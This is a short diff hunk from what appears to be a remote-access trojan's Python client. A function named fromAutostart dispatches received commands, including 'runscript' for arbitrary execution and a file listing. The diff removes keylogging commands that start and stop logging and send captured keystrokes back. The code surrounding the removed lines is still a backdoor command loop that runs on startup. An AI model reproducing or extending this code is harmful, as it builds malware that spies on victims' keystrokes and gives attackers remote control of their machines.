@@ -82,12 +82,6 @@ def fromAutostart():
                     stdoutput = ''
                 elif data.startswith("runscript"):
                     stdoutput = Execute(data[10:])
-                elif data.startswith("StartLogging"):
-                    stdoutput = startLogging()
-                elif data.startswith("StopLogging"):
-                    stdoutput = stopLogging()
-                elif data.startswith("GiveMeKeyStokes"):
-                    stdoutput = SendKeyStokes()
                 elif data.startswith("ls"):
                     string = {}
                     try:
